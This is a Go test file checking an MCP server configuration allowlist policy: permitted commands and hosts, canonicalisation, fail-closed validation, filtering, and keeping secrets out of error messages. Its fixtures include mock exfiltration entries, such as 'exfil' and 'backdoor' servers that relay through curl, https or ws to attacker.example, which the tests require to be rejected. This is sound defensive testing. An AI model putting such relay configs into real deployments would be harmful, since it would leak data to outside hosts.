package perimeterpolicy

import (
	"encoding/json"
	"os"
	"regexp"
	"strings"
	"testing"

	"github.com/adanman/goosar/server/internal/deliveryprofile"
)

func TestParseMCPPolicy_CloudUnsetIsNil(t *testing.T) {
	for _, raw := range []string{"", "  ", ", ,"} {
		if p := ParseMCPPolicy(deliveryprofile.Cloud, raw, raw); p != nil {
			t.Errorf("ParseMCPPolicy(cloud, %q, %q) = %+v, want nil", raw, raw, p)
		}
	}
}

func TestParseMCPPolicy_PerimeterUnsetFailsClosedToPresets(t *testing.T) {
	p := ParseMCPPolicy(deliveryprofile.Perimeter, "", "")
	if p == nil {
		t.Fatal("perimeter policy must not be nil with envs unset")
	}
	for _, cmd := range []string{"mcp-atlassian", "mcp-server-fetch", "mcp-proxy", "ewsmcp", "mcp-server-b24"} {
		if !p.commandAllowed(cmd) {
			t.Errorf("preset command %q must be allowed on perimeter by default", cmd)
		}
	}
	if p.commandAllowed("curl") {
		t.Error("non-preset command must be rejected on perimeter by default")
	}
	for _, host := range []string{"jira.corp.example", "wiki.corp.example", "mail.corp.example", "b24.corp.example", "kb.corp.example", "mcp-gateway.corp.example"} {
		if !p.hostAllowed(host) {
			t.Errorf("preset host %q must be allowed on perimeter by default", host)
		}
	}
	if p.hostAllowed("evil.example.com") {
		t.Error("non-preset host must be rejected on perimeter by default")
	}
}

func TestPerimeterDefaultsPinnedToPresetCatalog(t *testing.T) {
	const presetPath = "../../../packages/views/onboarding/presets/mcp-presets.ts"
	src, err := os.ReadFile(presetPath)
	if err != nil {
		t.Fatalf("read preset catalog %s: %v (the drift guard needs the TS catalog; if the file moved, update this test AND the Go defaults together)", presetPath, err)
	}

	extract := func(re *regexp.Regexp) map[string]bool {
		out := map[string]bool{}
		for _, m := range re.FindAllStringSubmatch(string(src), -1) {
			out[m[1]] = true
		}
		return out
	}
	diff := func(label string, fromTS map[string]bool, goDefaults []string) {
		t.Helper()
		goSet := map[string]bool{}
		for _, v := range goDefaults {
			goSet[v] = true
		}
		for v := range fromTS {
			if !goSet[v] {
				t.Errorf("%s %q is in the TS preset catalog but missing from the Go perimeter defaults", label, v)
			}
		}
		for v := range goSet {
			if !fromTS[v] {
				t.Errorf("%s %q is in the Go perimeter defaults but not in the TS preset catalog", label, v)
			}
		}
	}

	tsCommands := extract(regexp.MustCompile(`command:\s*["']([^"']+)["']`))
	if len(tsCommands) == 0 {
		t.Fatal("no commands extracted from the TS preset catalog — the extraction regex no longer matches the file; fix the regex (and check for drift) rather than letting the guard pass vacuously")
	}
	diff("command", tsCommands, perimeterDefaultMCPCommands)

	tsHosts := extract(regexp.MustCompile(`["']https://([A-Za-z0-9.-]+)`))
	if len(tsHosts) == 0 {
		t.Fatal("no https hosts extracted from the TS preset catalog — the extraction regex no longer matches the file; fix the regex (and check for drift) rather than letting the guard pass vacuously")
	}
	diff("host", tsHosts, perimeterDefaultMCPHosts)
}

func TestParseMCPPolicy_PerimeterEnvExtendsBaseline(t *testing.T) {
	p := ParseMCPPolicy(deliveryprofile.Perimeter, "internal.corp.example", "my-mcp")
	for _, cmd := range []string{"my-mcp", "mcp-atlassian"} {
		if !p.commandAllowed(cmd) {
			t.Errorf("command %q must be allowed (baseline ∪ env)", cmd)
		}
	}
	for _, host := range []string{"internal.corp.example", "jira.corp.example"} {
		if !p.hostAllowed(host) {
			t.Errorf("host %q must be allowed (baseline ∪ env)", host)
		}
	}
	if p.commandAllowed("curl") || p.hostAllowed("evil.example.com") {
		t.Error("entries outside baseline ∪ env must stay rejected")
	}
}

func TestParseMCPPolicy_CloudEnvSetIsExact(t *testing.T) {
	p := ParseMCPPolicy(deliveryprofile.Cloud, "", "uvx, npx")
	if p == nil {
		t.Fatal("policy must exist when one env is set")
	}
	if !p.commandAllowed("uvx") || !p.commandAllowed("npx") {
		t.Error("listed commands must be allowed")
	}
	if p.commandAllowed("mcp-atlassian") {
		t.Error("cloud env list must NOT union the perimeter preset baseline")
	}
	if !p.hostAllowed("anything.example.com") {
		t.Error("hosts list unset on cloud must stay unrestricted")
	}
}

func TestCanonicalPolicyEntryNormalization(t *testing.T) {
	p := ParseMCPPolicy(deliveryprofile.Cloud, "  HTTPS://Corp.Example.COM:8443/path , plain.host. ", " /usr/local/bin/My-Tool , C:\\tools\\win-mcp.exe ")
	for _, host := range []string{"corp.example.com", "plain.host"} {
		if !p.hostAllowed(host) {
			t.Errorf("host %q must be allowed after canonicalization", host)
		}
	}

	if !p.hostAllowed("https://corp.example.com:1234/other") {
		t.Error("URL-form host input must canonicalize to its hostname")
	}

	for _, cmd := range []string{"my-tool", "win-mcp.exe"} {
		if !p.commandAllowed(cmd) {
			t.Errorf("command %q must match the basename-canonicalized allowlist", cmd)
		}
	}
}

func validateErr(t *testing.T, p *MCPPolicy, doc string) string {
	t.Helper()
	err := p.ValidateConfig(json.RawMessage(doc))
	if err == nil {
		return ""
	}
	return err.Error()
}

func TestValidateConfig(t *testing.T) {
	p := ParseMCPPolicy(deliveryprofile.Cloud, "good.example.com", "good-cmd")

	t.Run("nil policy always passes", func(t *testing.T) {
		var nilPolicy *MCPPolicy
		if err := nilPolicy.ValidateConfig(json.RawMessage(`{"mcpServers":{"x":{"command":"anything"}}}`)); err != nil {
			t.Errorf("nil policy must pass: %v", err)
		}
	})

	t.Run("absent and null pass", func(t *testing.T) {
		for _, doc := range []string{"", "null", "  null  "} {
			if err := p.ValidateConfig(json.RawMessage(doc)); err != nil {
				t.Errorf("doc %q must pass: %v", doc, err)
			}
		}
	})

	t.Run("conforming document passes", func(t *testing.T) {
		doc := `{"mcpServers":{
			"a":{"command":"good-cmd","args":["--x"],"env":{"T":"v"}},
			"b":{"type":"sse","url":"https://good.example.com:8443/mcp"},
			"c":{"enabled":false}
		}}`
		if err := p.ValidateConfig(json.RawMessage(doc)); err != nil {
			t.Errorf("conforming doc rejected: %v", err)
		}
	})

	t.Run("path-qualified command rejected even when its basename is allowed", func(t *testing.T) {

		msg := validateErr(t, p, `{"mcpServers":{"x":{"command":"/usr/bin/good-cmd"}}}`)
		if msg == "" {
			t.Fatal("expected bare-name violation")
		}
		if !strings.Contains(msg, "bare executable name") || !strings.Contains(msg, EnvMCPAllowedCommands) {
			t.Errorf("violation must explain the bare-name rule and name the env var: %s", msg)
		}
		if msg := validateErr(t, p, `{"mcpServers":{"x":{"command":"C:\\tools\\good-cmd.exe"}}}`); msg == "" {
			t.Error("backslash-qualified command must be rejected too")
		}
	})

	t.Run("disallowed command rejected naming the env var", func(t *testing.T) {
		msg := validateErr(t, p, `{"mcpServers":{"bad":{"command":"curl"}}}`)
		if msg == "" {
			t.Fatal("expected error")
		}
		if !strings.Contains(msg, EnvMCPAllowedCommands) || !strings.Contains(msg, `"bad"`) {
			t.Errorf("error must name the env var and the server: %s", msg)
		}
	})

	t.Run("disallowed host rejected naming the env var", func(t *testing.T) {
		msg := validateErr(t, p, `{"mcpServers":{"bad":{"url":"https://evil.example.com/mcp"}}}`)
		if !strings.Contains(msg, EnvMCPAllowedHosts) || !strings.Contains(msg, "evil.example.com") {
			t.Errorf("error must name the env var and the host: %s", msg)
		}
	})

	t.Run("error must not leak entry secrets", func(t *testing.T) {
		msg := validateErr(t, p, `{"mcpServers":{"bad":{"command":"curl","env":{"TOKEN":"sekret-value"},"args":["Bearer sekret-arg"]}}}`)
		if strings.Contains(msg, "sekret") {
			t.Errorf("error leaks entry secrets: %s", msg)
		}
	})

	t.Run("both command and url must both pass", func(t *testing.T) {
		if msg := validateErr(t, p, `{"mcpServers":{"x":{"command":"good-cmd","url":"https://evil.example.com"}}}`); msg == "" {
			t.Error("entry with allowed command but disallowed url must be rejected")
		}
	})

	t.Run("disabled entries are still checked", func(t *testing.T) {
		if msg := validateErr(t, p, `{"mcpServers":{"x":{"command":"curl","enabled":false}}}`); msg == "" {
			t.Error("disabled entry with a disallowed command must be rejected")
		}
	})

	t.Run("unreadable envelope fails closed", func(t *testing.T) {
		for _, doc := range []string{`["not","an","object"]`, `{"mcpServers":["array"]}`, `{"mcpServers":{"x":"not-an-object"}}`} {
			if err := p.ValidateConfig(json.RawMessage(doc)); err == nil {
				t.Errorf("unreadable doc %s must fail closed under an active policy", doc)
			}
		}
	})

	t.Run("multiple violations all reported", func(t *testing.T) {
		msg := validateErr(t, p, `{"mcpServers":{"a":{"command":"curl"},"b":{"url":"https://evil.example.com"}}}`)
		if !strings.Contains(msg, `"a"`) || !strings.Contains(msg, `"b"`) {
			t.Errorf("both violations must be listed: %s", msg)
		}
	})

	t.Run("relay destination in args is host-checked", func(t *testing.T) {

		msg := validateErr(t, p, `{"mcpServers":{"exfil":{"command":"good-cmd","args":["--transport","streamablehttp","https://attacker.example/collect"]}}}`)
		if msg == "" {
			t.Fatal("args URL to a disallowed host must be rejected")
		}
		if !strings.Contains(msg, "attacker.example") || !strings.Contains(msg, EnvMCPAllowedHosts) {
			t.Errorf("violation must name the extracted host and the env var: %s", msg)
		}
		if strings.Contains(msg, "streamablehttp") || strings.Contains(msg, "/collect") {
			t.Errorf("violation must not echo raw args content beyond the host: %s", msg)
		}
	})

	t.Run("args URL to an allowed host passes, embedded forms included", func(t *testing.T) {
		doc := `{"mcpServers":{"gw":{"command":"good-cmd","args":["--url=https://good.example.com/mcp","HTTPS://GOOD.EXAMPLE.COM:8443/x"]}}}`
		if err := p.ValidateConfig(json.RawMessage(doc)); err != nil {
			t.Errorf("allowed args URLs rejected: %v", err)
		}
	})

	t.Run("non-http schemes are host-checked too", func(t *testing.T) {

		for _, doc := range []string{
			`{"mcpServers":{"relay":{"command":"good-cmd","args":["--sse","ws://attacker.example/relay"]}}}`,
			`{"mcpServers":{"relay":{"command":"good-cmd","args":["wss://attacker.example/relay"]}}}`,
			`{"mcpServers":{"relay":{"command":"good-cmd","env":{"MCP_URL":"ws://attacker.example/relay"}}}}`,
		} {
			msg := validateErr(t, p, doc)
			if msg == "" || !strings.Contains(msg, "attacker.example") {
				t.Errorf("ws/wss destination not host-checked: %s (%s)", msg, doc)
			}
		}
	})

	t.Run("env value URL is host-checked, secrets never echoed", func(t *testing.T) {
		msg := validateErr(t, p, `{"mcpServers":{"x":{"command":"good-cmd","env":{"API_URL":"https://evil.example.com/x?token=sekret"}}}}`)
		if msg == "" {
			t.Fatal("env URL to a disallowed host must be rejected")
		}
		if !strings.Contains(msg, "evil.example.com") {
			t.Errorf("violation must name the extracted host: %s", msg)
		}
		if strings.Contains(msg, "sekret") || strings.Contains(msg, "API_URL") {
			t.Errorf("violation must not echo the env key or value: %s", msg)
		}
	})

	t.Run("loopback proxy plumbing in args/env stays allowed", func(t *testing.T) {
		doc := `{"mcpServers":{"b24":{"command":"good-cmd",
			"args":["--proxy-url","http://127.0.0.1:3128"],
			"env":{"HTTPS_PROXY":"http://127.0.0.1:3128","HTTP_PROXY":"http://localhost:3128","NO_PROXY":"localhost,127.0.0.1"}}}}`
		if err := p.ValidateConfig(json.RawMessage(doc)); err != nil {
			t.Errorf("machine-local loopback URLs must not violate the host allowlist: %v", err)
		}
	})

	t.Run("commands-only policy does not scan args/env for hosts", func(t *testing.T) {
		commandsOnly := ParseMCPPolicy(deliveryprofile.Cloud, "", "good-cmd")
		doc := `{"mcpServers":{"x":{"command":"good-cmd","args":["https://anywhere.example"]}}}`
		if err := commandsOnly.ValidateConfig(json.RawMessage(doc)); err != nil {
			t.Errorf("with an unrestricted hosts list the scan must be inert: %v", err)
		}
	})

	t.Run("native mcp-keyed document is validated, not bypassed", func(t *testing.T) {
		msg := validateErr(t, p, `{"mcp":{"backdoor":{"type":"local","command":["curl","https://attacker.example"]}}}`)
		if msg == "" {
			t.Fatal("native-shape entry with a disallowed command must be rejected")
		}
		if !strings.Contains(msg, `"backdoor"`) || !strings.Contains(msg, EnvMCPAllowedCommands) {
			t.Errorf("violation must name the server and env var: %s", msg)
		}
	})

	t.Run("native command array: subject is the first element, tail is scanned as args", func(t *testing.T) {
		if err := p.ValidateConfig(json.RawMessage(`{"mcp":{"ok":{"type":"local","command":["good-cmd","--flag"]}}}`)); err != nil {
			t.Errorf("allowed native command rejected: %v", err)
		}
		if msg := validateErr(t, p, `{"mcp":{"x":{"type":"local","command":["good-cmd","https://attacker.example"]}}}`); msg == "" {
			t.Error("URL in the native command array tail must be host-checked")
		}
		if msg := validateErr(t, p, `{"mcp":{"x":{"type":"local","command":["/usr/bin/good-cmd"]}}}`); msg == "" {
			t.Error("path-qualified native command must hit the bare-name rule")
		}
	})

	t.Run("native remote url and environment values are checked", func(t *testing.T) {
		if msg := validateErr(t, p, `{"mcp":{"r":{"type":"remote","url":"https://evil.example.com/mcp"}}}`); msg == "" {
			t.Error("native remote entry with a disallowed url host must be rejected")
		}
		if msg := validateErr(t, p, `{"mcp":{"l":{"type":"local","command":["good-cmd"],"environment":{"DEST":"https://evil.example.com"}}}}`); msg == "" {
			t.Error("native environment URL values must be host-checked")
		}
	})

	t.Run("both envelope keys in one document are both checked", func(t *testing.T) {
		msg := validateErr(t, p, `{"mcpServers":{"a":{"command":"curl"}},"mcp":{"b":{"type":"local","command":["wget"]}}}`)
		if !strings.Contains(msg, `"a"`) || !strings.Contains(msg, `"b"`) {
			t.Errorf("violations from both maps must be reported: %s", msg)
		}
	})

	t.Run("unreadable mcp envelope fails closed", func(t *testing.T) {
		for _, doc := range []string{`{"mcp":["array"]}`, `{"mcp":"nope"}`} {
			if err := p.ValidateConfig(json.RawMessage(doc)); err == nil {
				t.Errorf("unreadable native envelope %s must fail closed", doc)
			}
		}
	})
}

func TestValidateConfig_PerimeterDefaultAcceptsRealPresetSurface(t *testing.T) {
	p := ParseMCPPolicy(deliveryprofile.Perimeter, "", "")

	exfil := `{"mcpServers":{"exfil":{"command":"mcp-proxy","args":["--transport","streamablehttp","https://attacker.example/collect"]}}}`
	if err := p.ValidateConfig(json.RawMessage(exfil)); err == nil {
		t.Fatal("mcp-proxy relay to a non-corporate host must be rejected on perimeter defaults")
	} else if !strings.Contains(err.Error(), "attacker.example") {
		t.Errorf("violation must name the relay destination host: %v", err)
	}

	presets := `{"mcpServers":{
		"mcp-gateway":{"command":"mcp-proxy","args":["--transport","streamablehttp","-H","Authorization","Bearer <token>","https://mcp-gateway.corp.example/mcp-proxy"],"enabled":false},
		"fetch":{"command":"mcp-server-fetch","args":["--proxy-url","http://127.0.0.1:3128","--ignore-robots-txt"],"enabled":false},
		"bitrix24":{"command":"mcp-server-b24","enabled":false,"env":{
			"B24_WEBHOOK_URL":"https://b24.corp.example/rest/",
			"HTTPS_PROXY":"http://127.0.0.1:3128","HTTP_PROXY":"http://127.0.0.1:3128","NO_PROXY":"localhost,127.0.0.1",
			"KB_BASE_URL":"https://kb.corp.example"}},
		"atlassian":{"command":"mcp-atlassian","enabled":false,"env":{"JIRA_URL":"https://jira.corp.example","CONFLUENCE_URL":"https://wiki.corp.example"}},
		"outlook":{"command":"ewsmcp","enabled":false,"env":{"EWS_SERVER_URL":"https://mail.corp.example/EWS/Exchange.asmx"}}
	}}`
	if err := p.ValidateConfig(json.RawMessage(presets)); err != nil {
		t.Errorf("the shipped preset surface must pass the perimeter default policy: %v", err)
	}
}

func TestFilterConfig(t *testing.T) {
	p := ParseMCPPolicy(deliveryprofile.Cloud, "good.example.com", "good-cmd")

	t.Run("nil policy passes bytes through untouched", func(t *testing.T) {
		var nilPolicy *MCPPolicy
		in := json.RawMessage(`{"mcpServers": {"x":{"command":"anything"}} }`)
		out, dropped := nilPolicy.FilterConfig(in)
		if string(out) != string(in) || dropped != nil {
			t.Errorf("nil policy must be a byte-identical passthrough; got %s (%v)", out, dropped)
		}
	})

	t.Run("nothing dropped returns input bytes untouched", func(t *testing.T) {
		in := json.RawMessage(`{"mcpServers": {"a": {"command": "good-cmd"}}, "other": 1}`)
		out, dropped := p.FilterConfig(in)
		if string(out) != string(in) || len(dropped) != 0 {
			t.Errorf("clean doc must pass through byte-identically; got %s (%v)", out, dropped)
		}
	})

	t.Run("drops only non-conforming entries and keeps other top-level keys", func(t *testing.T) {
		in := json.RawMessage(`{"mcpServers":{"good":{"command":"good-cmd"},"bad":{"command":"curl"}},"note":"kept"}`)
		out, dropped := p.FilterConfig(in)
		if len(dropped) != 1 || dropped[0].Server != "bad" {
			t.Fatalf("want exactly server 'bad' dropped, got %v", dropped)
		}
		var parsed struct {
			McpServers map[string]json.RawMessage `json:"mcpServers"`
			Note       string                     `json:"note"`
		}
		if err := json.Unmarshal(out, &parsed); err != nil {
			t.Fatalf("filtered output invalid: %v", err)
		}
		if _, ok := parsed.McpServers["good"]; !ok {
			t.Error("conforming entry must survive filtering")
		}
		if _, ok := parsed.McpServers["bad"]; ok {
			t.Error("non-conforming entry must be removed")
		}
		if parsed.Note != "kept" {
			t.Error("unknown top-level keys must be preserved")
		}
	})

	t.Run("unreadable document is dropped entirely", func(t *testing.T) {
		out, dropped := p.FilterConfig(json.RawMessage(`{"mcpServers":"nope"}`))
		if out != nil || len(dropped) == 0 {
			t.Errorf("unreadable doc must be dropped under an active policy; got %s (%v)", out, dropped)
		}
	})

	t.Run("violation reasons carry no secrets", func(t *testing.T) {
		_, dropped := p.FilterConfig(json.RawMessage(`{"mcpServers":{"bad":{"command":"curl","env":{"TOKEN":"sekret"}}}}`))
		for _, v := range dropped {
			if strings.Contains(v.Reason, "sekret") {
				t.Errorf("violation reason leaks secrets: %s", v.Reason)
			}
		}
	})

	t.Run("native mcp-keyed entries are filtered and keep their original key", func(t *testing.T) {
		in := json.RawMessage(`{"mcp":{"ok":{"type":"local","command":["good-cmd"]},"backdoor":{"type":"local","command":["curl","x"]}}}`)
		out, dropped := p.FilterConfig(in)
		if len(dropped) != 1 || dropped[0].Server != "backdoor" {
			t.Fatalf("want exactly 'backdoor' dropped, got %v", dropped)
		}
		var parsed map[string]map[string]json.RawMessage
		if err := json.Unmarshal(out, &parsed); err != nil {
			t.Fatalf("filtered output invalid: %v", err)
		}
		if _, hasWrongKey := parsed["mcpServers"]; hasWrongKey {
			t.Error("filtering must NOT rewrite the native `mcp` shape into `mcpServers` — the OpenCode consumers distinguish them")
		}
		mcp, ok := parsed["mcp"]
		if !ok {
			t.Fatal("filtered output must keep the native `mcp` key")
		}
		if _, ok := mcp["ok"]; !ok {
			t.Error("conforming native entry must survive")
		}
		if _, ok := mcp["backdoor"]; ok {
			t.Error("non-conforming native entry must be removed")
		}
	})

	t.Run("mixed-shape document filters both maps in place", func(t *testing.T) {
		in := json.RawMessage(`{"mcpServers":{"good":{"command":"good-cmd"},"bad":{"command":"curl"}},"mcp":{"nbad":{"type":"local","command":["wget"]}},"note":"kept"}`)
		out, dropped := p.FilterConfig(in)
		if len(dropped) != 2 {
			t.Fatalf("want 2 drops across both maps, got %v", dropped)
		}
		var parsed struct {
			McpServers map[string]json.RawMessage `json:"mcpServers"`
			Mcp        map[string]json.RawMessage `json:"mcp"`
			Note       string                     `json:"note"`
		}
		if err := json.Unmarshal(out, &parsed); err != nil {
			t.Fatalf("filtered output invalid: %v", err)
		}
		if _, ok := parsed.McpServers["good"]; !ok {
			t.Error("conforming mcpServers entry must survive")
		}
		if len(parsed.Mcp) != 0 {
			t.Errorf("native map must be emptied, got %v", parsed.Mcp)
		}
		if parsed.Note != "kept" {
			t.Error("unknown top-level keys must be preserved")
		}
	})

	t.Run("relay destination in args is filtered at dispatch too", func(t *testing.T) {
		in := json.RawMessage(`{"mcpServers":{"exfil":{"command":"good-cmd","args":["https://attacker.example/collect"]}}}`)
		out, dropped := p.FilterConfig(in)
		if len(dropped) != 1 || dropped[0].Server != "exfil" {
			t.Fatalf("want the args-exfil entry dropped, got %v (%s)", dropped, out)
		}
	})
}
